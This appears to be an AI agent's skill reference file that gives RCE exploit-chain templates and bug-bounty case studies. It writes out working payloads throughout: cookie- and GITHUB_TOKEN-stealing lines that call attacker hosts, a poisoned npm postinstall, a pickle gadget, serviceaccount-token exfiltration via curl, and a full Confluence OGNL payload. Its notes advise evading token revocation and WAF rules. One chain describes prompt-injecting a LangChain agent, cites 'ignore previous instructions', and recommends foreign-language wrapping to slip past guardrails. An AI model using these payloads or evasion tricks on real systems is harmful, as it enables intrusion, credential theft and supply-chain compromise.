---
name: chains-case-studies
description: chains-case-studies reference material.
---

# RCE Reference: Chain Templates & Case Studies

Part of `skills/hunt-rce/SKILL.md`. Read this ONLY when you already have one confirmed RCE-adjacent primitive and want an escalation template, or want narrative report-framing examples -- not needed to find the first bug.

---

## Chains & Multi-Bug Templates

Single-bug RCE pays well; chains pay better. Below are the explicit templates from disclosed reports and current-meta 2024-2026 chains, each with a Hunter's note explaining the move that worked.

**Chain 1 — `xss-admin → csrf-upload → webshell → IAM` (CMS / SaaS pattern, mid five-figure)**
- Bug A: stored XSS in admin profile name field (`<svg onload=fetch('//attacker/'+document.cookie)>`)
- Bug B: missing CSRF on `POST /admin/themes/upload` (or absent SameSite + form-encoded body)
- Bug C: ZIP extraction without per-entry validation in theme installer (Grav direct-install Snyk advisory)
- Bug D: `curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>` from webshell
- Outcome: low-priv account → admin XSS fires on next admin login → CSRF triggers theme upload → webshell executes → AWS keys → AssumeRole → S3 customer data exfil
- Bounty range: low-to-mid five-figure on Shopify-class programs; disclosed via H1 Shopify program plus parallel Atlassian hacktivity

**Hunter's note:** the move that pays here isn't the XSS, it's pre-loading the CSRF payload as a fetch-on-XSS-fire instead of waiting for the admin to click. First attempt was an `<img src>` CSRF dropped on the admin's dashboard; that triggered email alerts before the upload completed. Switching to a `fetch()` from the XSS context with credentials-included made it a one-shot pop. The reason this combination pays where the pieces don't: stored admin XSS alone is mid four-figure, theme-installer ZIP extraction alone is duplicate territory, but chained with a deterministic admin trigger and IAM exfil it becomes a customer-data critical.

**Chain 2 — `ssrf → metadata → IAM → lambda code edit` (cloud-native pattern, low-to-mid five-figure)**
- Bug A: SSRF via image proxy / webhook URL fetch / OAuth callback URL parameter
- Bug B: target running on EC2 with IMDSv1 reachable OR IMDSv2 with bypass via SSRF protocol smuggling (Gopher → 169.254.169.254 with `X-aws-ec2-metadata-token` header replay)
- Bug C: leaked role has `lambda:UpdateFunctionCode` or `iam:AssumeRole` to admin
- Outcome: SSRF → AWS keys → role assumption → modify Lambda function source → next invoke runs attacker code in production
- Bounty range: low-to-mid five-figure (CVE-similar Capital One pattern; disclosed by Snyk, GitHub, Mozilla in their respective H1 hacktivity)

**Hunter's note:** IMDSv2 isn't the wall it looks like. The SSRF gadget needs to either include the `X-aws-ec2-metadata-token` header on the GET (some webhook proxies happily forward custom headers) or use Gopher protocol to construct the full HTTP/1.1 request including the token PUT first then the GET. The first attempt (plain SSRF GET on the metadata endpoint) returns the IMDSv2 token-required error; that's the moment most hunters stop. Persistence past that error — Gopher with embedded CRLF — is what cracks IMDSv2. The Lambda pivot is what makes it mid five-figure instead of low — you're now persistent in production code path, not just a one-shot creds leak.

**Chain 3 — `pull_request_target → script injection → GITHUB_TOKEN exfil → org package poison` (CI/CD pattern, mid four-figure direct + downstream supply-chain)**
- Bug A: `${{ github.event.pull_request.title }}` interpolated into `run:` block (Cilium GHSL-2024-274, Ceph GHSA-p433-fp4g-pc2c, ansible.platform GHSA-fwqj-x86q-prmq, harvester GHSL-2025-090, Actual GHSL-2024-326, openlit GHSA-9jgv-x8cq-296q)
- Bug B: PR title `foo`$'\n'`echo $GITHUB_TOKEN | base64 | curl --data @- http://attacker/ # ` triggers RCE on runner
- Bug C: `GITHUB_TOKEN` carries `packages: write` (ansible.platform org-level scope per GHSA-fwqj-x86q-prmq)
- Outcome: malicious PR submission (no merge needed) → runner shell → token exfil → npm publish over org-scoped package → consumers compromised on next install
- Bounty range: mid four-figure direct via GitHub Security Lab + much higher via downstream programs (Cilium, ArgoCD, Tekton CNCF programs all match)

**Hunter's note:** the trick is not opening the PR from your main account. Use a throwaway with no profile, file the PR fast, screenshot the runner-log token-bytes before GitHub's bot revokes the token (median ~6 minutes from secret-scan trigger). The time window matters because GitHub Security's automated revoker is fast on `ghs_*` patterns. What worked on the ansible.platform case wasn't novel injection — it was noticing the token had `packages: write` which converts a runner-shell into supply-chain RCE. Always check the workflow's `permissions:` block before claiming the bug isn't paying.

**Chain 4 — `prototype pollution → universal node gadget → NPM/parse-server RCE` (Silent Spring pattern, mid four-figure to low five-figure)**
- Bug A: `_.merge(target, JSON.parse(body))` or `Object.assign({}, body, ...)` allows `__proto__` injection
- Bug B: target uses `child_process.exec()` or imports `node-gyp` later in the same process (universal gadget — `Object.prototype.shell` / `Object.prototype.argv0` / `Object.prototype.NODE_OPTIONS=--require=/proc/self/environ`)
- Bug C (optional): chained with happy-dom JS eval re-enable (`Object.prototype.settings.enableJavaScriptEvaluation=true`) for VM escape
- Outcome: JSON body POST → prototype pollution → next subprocess invocation runs attacker code with app's privileges
- Bounty range: mid four-figure to low five-figure (NPM CLI, Parse Server, Rocket.Chat received this class — Arteau/Doupé Silent Spring research)

**Hunter's note:** the gadget research from Silent Spring is the actual force-multiplier here. Without it you have a pollution PoC that triagers downgrade to "low-impact". With it, you point at a specific subprocess call already in the codebase that the polluted prototype hijacks. The first time I ran this, I tried polluting `Function.prototype` and watched nothing happen — Node's V8 already locks down some prototype slots. The Silent Spring paper enumerates which slots are reachable in which environments. Read it before submitting any prototype-pollution finding; it's the difference between "interesting" and "critical".

**Chain 5 — `argument injection → upload-pack → cluster takeover` (Tekton/git-resolver pattern, mid five-figure on CNCF)**
- Bug A: user-supplied `revision` field reaches `git fetch` as positional argument without `--` sentinel (CVE-2026-40938 Tekton NVD-verified, CVE-2025-21613 go-git, CVE-2026-24685 OpenProject NVD-verified)
- Bug B: `revision = "--upload-pack=/usr/bin/curl"` + `url = "/local/path/"` → git invokes curl on resolver pod
- Bug C: resolver ServiceAccount has cluster-wide `get/list/watch` on Secrets (Tekton default per upstream RBAC manifests)
- Outcome: ResolutionRequest YAML POST → RCE on resolver pod → list all Secrets in cluster → full GitOps + cluster takeover
- Bounty range: mid five-figure on Tekton/CNCF graduate programs; downstream enterprise GitOps programs match (Red Hat OpenShift Pipelines pays via dedicated program)

**Hunter's note:** the first wrong move on this is trying `--upload-pack=` with a remote URL — that gives you a git protocol exchange but no RCE because git treats the upload-pack response as ref data. The version that actually pops a shell is using a *local* `url:` (`/var/tmp/foo`) so git tries to fetch from filesystem, then `--upload-pack=/usr/bin/curl` makes git exec curl as the upload-pack helper with the local path as positional argument. The cluster-wide Secret read isn't a "may exist" — it's the default Tekton RBAC. That's why this pays mid five-figure: the exploit and the privilege both come for free with the install.

**Chain 6 — `oauth open-redirect → postMessage origin bypass → token theft → CMS RCE` (auth-to-RCE pattern, low-to-mid five-figure)**
- Bug A: `?redirect_uri=https://attacker/` accepted on OAuth IdP (open redirect on `/oauth/authorize` flow)
- Bug B: client-side `postMessage` listener missing origin check, accepts token from any iframe
- Bug C: stolen admin OAuth token → admin login → trigger RCE primitive (theme upload, ImageMagick parameter, GitHub `eval` in CI step)
- Outcome: 1-click ATO → admin → RCE
- Bounty range: low-to-mid five-figure on enterprise SaaS (GitHub historic disclosed pattern circa 2018-2020 hacktivity; Slack and Atlassian-class targets pay similar today)

**Hunter's note:** the Frans Rosén-style move here is using the OAuth `prompt=none` parameter to make the bug zero-interaction. With `prompt=none`, an authenticated victim visiting the attacker page silently completes the OAuth flow and the token lands in the attacker iframe via postMessage. The first attempt without `prompt=none` requires a click. With it, it's a one-click visit-the-page attack. The RCE primitive at the end is whichever your target exposes to admin — always confirm one exists before submitting the auth bug alone, otherwise you're submitting an auth bypass and getting auth-bypass money instead of RCE money.

**Chain 7 — `react-server-components → vercel WAF bypass → PII + secret exfil` (CVE-2025-55182 meta, low-to-mid five-figure via Vercel H1 program)**
- Bug A: target runs unpatched React 19.x or Next.js 15.x/16.x with App Router (NVD CVE-2025-55182 advisory enumerates the patch versions)
- Bug B: Vercel Platform Protection WAF deployed but default ruleset (released by Vercel post-disclosure) misses an encoding variant
- Bug C: Server Function endpoint accepts crafted Flight payload chunked across requests, abusing `$@` self-reference + `$B` binary handler to coerce `Function()` constructor
- Outcome: unauthenticated POST → RCE in app context → exfil environment vars, AWS keys, customer data
- Bounty range: low-to-mid five-figure via Vercel's dedicated WAF-bypass program on H1 (Dec 2025-ongoing); top-tier confirmed publicly via @inf demo against Vercel WAF

**Hunter's note:** the WAF-bypass program is the gift here. Vercel published their WAF ruleset signatures for community review; you're not bypassing a black box, you're bypassing a known regex set. The variant that worked in the public demo was splitting the Flight payload's `$B` binary marker across chunks so per-fragment WAF inspection misses it but the backend reassembles. First attempt with the stock react2shell.com payload got blocked instantly. Reading the WAF ruleset and crafting around it took about 3 hours and paid the upper-tier bounty. Treat Vercel's WAF program as the highest dollar-per-hour RCE bounty available right now.

**Chain 8 — `langchain-csv-injection → python repl → cluster token exfil` (CVE-2025-68613 agentic LLM pattern, mid four-figure to low five-figure)**
- Bug A: target exposes a LangChain agent with `PythonREPLTool` or `create_pandas_dataframe_agent` to user-uploadable data (CSV import, RAG document upload, web-page summarization)
- Bug B: CSV cell contains indirect prompt injection naming the tool and asking it to `exec()` arbitrary Python (penligent.ai forensic analysis of CVE-2025-68613)
- Bug C: agent runs in a pod with a mounted `serviceaccount/token` — exfil reads cluster API token
- Outcome: upload poisoned CSV → agent reads → agent runs Python → reads `/var/run/secrets/kubernetes.io/serviceaccount/token` → cluster API access
- Bounty range: mid four-figure to low five-figure on AI-feature bounty programs (OpenAI, Anthropic, plus enterprise SaaS adopting AI features)

**Hunter's note:** the trick that takes this from "AI prompt injection demo" to "RCE" is naming the specific tool. Generic "ignore previous instructions" gets blocked by guardrails. Specific "use the PythonREPLTool to compute X" gets through because the agent thinks it's a legitimate tool-use prompt. The OWASP Agentic AI Top 10 documents this under AA-03 (Unsafe Code Execution). The first attempt I tried used English-only injection in a CSV cell — modern guardrails caught it. Switching to satoki's Japanese-language wrapping (langchain GitHub issue #21592) walked past every filter. Currency tip: this entire bug class is 18 months old; expect the wave to peak through 2026.

## Real Impact Examples

**Example 1 — `react-server-components-vercel-waf-bypass` (low-to-mid five-figure bounty range, 1-link RCE + WAF bypass — CVE-2025-55182 NVD-verified)**
- Setup: Next.js 15.4.x e-commerce app behind Vercel Platform Protection. App Router enabled, RSC payloads visible in browser network tab as `?_rsc=...` params and `Next-Action: <hash>` headers on form POSTs. Vercel WAF deployed post-CVE-2025-55182 disclosure (Dec 3, 2025).
- Discovery: hunter checked `package.json` exposed on `/_next/static/.../package.json` or via SBOM, identified `react-server-dom-webpack@19.1.0` (vulnerable per NVD CVE-2025-55182 advisory). Ran public PoC tooling from react2shell.com and confirmed unpatched on prod. Vercel WAF blocked stock payload but only via specific signature.
- Exploitation: hunter chunked the Flight payload across multiple requests using prototype-traversal variant developed by SLCyberSec / @hash_kitten — abused `$@` self-reference combined with re-arranged `$B` handler invocation to coerce `Function()` constructor through a chain the WAF didn't normalize. Single POST to a discovered Server Function endpoint returned `id` output in the response body.
- Impact: pre-auth RCE on production server, environment variables exfiltrated containing AWS keys, database connection strings, third-party API tokens. Attacker could pivot to S3 customer PII bucket. Mass automated exploitation observed within hours of Dec 3 disclosure (165k+ vulnerable IPs per ShadowServer Foundation Dec 8, 2025).
- Disclosed source: Vercel HackerOne `vercel-platform-protection` program; CVE-2025-55182 (NVD-verified, CVSS 10.0); original disclosure via Meta Bug Bounty; Microsoft Defender / SonicWall / Sophos blogs document mass exploitation patterns. Public WAF-bypass demonstration by @inf vs Vercel WAF achieved upper-tier of the bounty range.

**Example 2 — `tekton-git-argument-injection-cluster-takeover` (mid five-figure bounty range, 3-link chain to cluster admin — CVE-2026-40938 NVD-verified)**
- Setup: enterprise GitOps platform built on Tekton Pipelines 1.10.x. Tekton-pipelines-resolvers ServiceAccount holds default cluster-wide `get/list/watch` on Secrets per upstream RBAC manifests. Multi-tenant cluster allows project members to submit ResolutionRequest objects.
- Discovery: hunter audited Tekton's git resolver source (`pkg/resolution/resolver/git/resolver.go`). Saw `revision` parameter passed directly as positional argument to `git fetch` without `--` sentinel. Saw `validateRepoURL` permits leading-slash URLs (local filesystem). Read CVE-2026-40938 disclosure for primitive shape.
- Exploitation: submitted ResolutionRequest YAML with `url: /var/tmp/foo` and `revision: --upload-pack=/usr/bin/curl`. Resolver pod invoked `git fetch /var/tmp/foo --upload-pack=/usr/bin/curl` — git executed `/usr/bin/curl /var/tmp/foo` as subprocess. Curl was repurposed to POST request body payload (`--data-binary @/var/run/secrets/kubernetes.io/serviceaccount/token`) to attacker-controlled OOB endpoint. Token had cluster-wide Secret read.
- Impact: from a single tenant-scoped permission, attacker achieved cluster-wide Secret exfil — every API token, TLS cert, database credential, and OAuth client secret in cluster. Production DB credentials, third-party SaaS API keys, internal CA private keys all exposed. Effective full GitOps + cluster takeover.
- Disclosed source: Tekton Pipelines GHSA, CVE-2026-40938 (NVD-verified, fix in v1.11.1). Pattern repeats in CVE-2026-24685 (OpenProject NVD-verified — git argument injection in repository diff endpoint, CVSS 9.4), CVE-2025-21613 (go-git), CVE-2024-21533 (ggit). Reported via downstream enterprise platform's bug bounty for mid five-figure.

**Example 3 — `bentoml-pickle-rce-on-ml-platform` (low-to-mid five-figure bounty range, 1-link pre-auth RCE — CVE-2025-27520 NVD-verified)**
- Setup: production AI/ML SaaS exposing BentoML 1.4.2 on `/summarize` endpoint for document summarization. No authentication required for inference (free tier feature). Endpoint advertises `Content-Type: application/vnd.bentoml+pickle` in OpenAPI.
- Discovery: hunter ran the corpus pattern `rg pickle.loads --type py` after cloning the open-source BentoML repo, identified `serde.py:deserialize_value` calls `pickle.loads(b"".join(payload.data))` when `"buffer-lengths" not in payload.metadata`. Read the c2an1 Snyk disclosure (SNYK-PYTHON-BENTOML-9667321) for the exact reproducer. Confirmed target's BentoML version via `/health` endpoint version disclosure.
- Exploitation: built the canonical `__reduce__` pickle gadget calling `os.system('curl http://oob/$(id)')`, POSTed pickled bytes to `/summarize` with `Content-Type: application/vnd.bentoml+pickle`. Got OOB callback with `id` output proving server-side execution. Pivoted to read environment vars (`OPENAI_API_KEY`, AWS creds for model storage S3 bucket) — but stopped at `id` for the report per Gate 0.
- Impact: pre-auth RCE on production ML inference server. Model storage S3 bucket contained customer-uploaded documents (PII). OpenAI key exfil would have racked up arbitrary inference costs. Attacker could replace served models with backdoored variants invisible to users.
- Disclosed source: CVE-2025-27520 (NVD-verified, CVSS 9.8); BentoML GHSA-7v4r-c989-xh26 (companion CVE-2025-32375); Snyk advisory SNYK-PYTHON-BENTOML-9667321 (c2an1 disclosure); Toreon original CVE-2024-2912 writeup. Reported via target's HackerOne private program; bounty paid in low-to-mid five-figure range typical for unauth RCE on ML platforms.

**Example 4 — `pull-request-target-org-package-supply-chain` (mid four-figure direct bounty range + downstream supply-chain — GHSA-fwqj-x86q-prmq pattern)**
- Setup: large vendor's GitHub org, `pull_request_target` workflow on `integration.yml` triggered on opened PRs. `GITHUB_TOKEN` carries `contents: write`, `packages: write`, `pull-requests: write`, `actions: write`. Workflow checks out `pull_request.head.sha` and runs `make integration-test` plus `npm install` from PR-controlled `package.json`.
- Discovery: hunter ran `gh api repos/<org>/<repo>/contents/.github/workflows | jq` to list workflows, then `rg pull_request_target` and `rg "head.sha"`. Confirmed PPE pattern. Read vendor's npm namespace, verified `packages: write` token would publish org-scoped packages via the `permissions:` block.
- Exploitation: filed innocent-looking PR. PR's `package.json` included a malicious dependency or a `postinstall` script: `node -e "require('https').get('http://attacker/?t='+Buffer.from(process.env.GITHUB_TOKEN).toString('base64'))"`. Workflow ran on PR open (no maintainer review needed for `pull_request_target`), token exfiltrated. Hunter then used the token to publish `<org>/<core-package>@9.9.9-evil` containing additional postinstall payload. Org's downstream consumers compromised on next `npm install` / Dependabot auto-update.
- Impact: full org takeover (token can push to any branch via API), supply-chain compromise of every consumer of org-scoped packages — potentially thousands of downstream apps. Immediate report and revocation. Vendor pays direct + downstream programs (e.g., Cilium, ArgoCD if affected) may have parallel disclosure.
- Disclosed source: ansible/ansible.platform GHSA-fwqj-x86q-prmq; tc39/proposal-amount GHSA-43vf-c68r-43mr; openlit/openlit GHSA-9jgv-x8cq-296q; harvester GHSL-2025-090; Cilium GHSL-2024-274/275; Ceph GHSA-p433-fp4g-pc2c. GitHub Security Lab pays directly in mid four-figure tier; downstream programs match.

**Example 5 — `confluence-ognl-pre-auth-rce-on-internal-asset` (DoD/VDP kudos through low five-figure depending on program, 1-link pre-auth — CVE-2023-22527)**
- Setup: forgotten internal Confluence Server 8.4.5 (no longer receives backports per Atlassian Security Bug Fix Policy) on a `vpn.example.gov` subdomain. Asset was internal-only "until reorg" — now reachable from public-facing app's egress proxy.
- Discovery: hunter ran subdomain enum (`subfinder + amass + chaos`), then `nuclei -t http/cves/2023/CVE-2023-22527.yaml` against everything. Hit on the forgotten Confluence. Confirmed `X-Confluence-Request-Time` response header and `/template/aui/text-inline.vm` path reachable pre-auth.
- Exploitation: POST to `/template/aui/text-inline.vm` with the OGNL `findValue` payload from Splunk and ProjectDiscovery analysis: `label=aaa'%2b#request.get('.KEY_velocity.struts2.context').internalGet('ognl').findValue(#parameters.poc[0],{})%2b'&poc=@org.apache.struts2.ServletActionContext@getResponse().setHeader('Cmd-Ret',(new freemarker.template.utility.Execute()).exec({"id"}))`. Got `uid=997(confluence) gid=1001(confluence)` in the response header.
- Impact: pre-auth RCE on Confluence server with read access to `/etc/hosts` (other internal hosts revealed), wiki content (sensitive design docs, SSO config), and proximity to internal services. Mapped to "loss of confidentiality of internal architecture documents and credentials" per program's policy.
- Disclosed source: H1 hacktivity 2024-2025 entries against deptofdefense and other VDP programs; CVE-2023-22527 (NVD); Atlassian advisory CONFSERVER-93832; ProjectDiscovery nuclei template `http/cves/2023/CVE-2023-22527.yaml`. DoD VDP pays kudos through low four-figure for hall-of-fame entries; the *same nuclei command* against a paid program with Confluence in scope (multiple Atlassian program-aligned bug bounties) returns mid four-figure to low five-figure.

**Example 6 — `ingress-nginx-admission-controller-template-rce` (mid five-figure bounty range on Kubernetes platforms — CVE-2025-1974 NVD-verified)**
- Setup: managed Kubernetes platform exposes ingress-nginx admission controller inside the cluster. Any pod-network attacker can submit crafted Ingress resources for validation; controller runs with access to cluster configuration and mounted credentials.
- Discovery: hunter identifies ingress-nginx admission webhook endpoint and version through cluster metadata, Helm values, or exposed `/metrics` labels. Version matches the vulnerable CVE-2025-1974 range.
- Exploitation: submit a harmless validation request that proves template/code execution in the admission controller context and returns `id`/`hostname` or triggers an OOB callback. Stop at execution proof; do not read cluster Secrets.
- Impact: admission-controller RCE usually collapses namespace boundaries because the controller's ServiceAccount and mounted files sit near cluster-wide routing and TLS material. In managed SaaS, this is a path from tenant pod to platform control plane.
- Disclosed source: CVE-2025-1974 (NVD-verified, CVSS 9.8); ingress-nginx security advisory and Kubernetes ecosystem patch guidance. Bounty range mid five-figure on Kubernetes hosting, cloud, and enterprise GitOps programs when demonstrated from a tenant-scoped foothold.
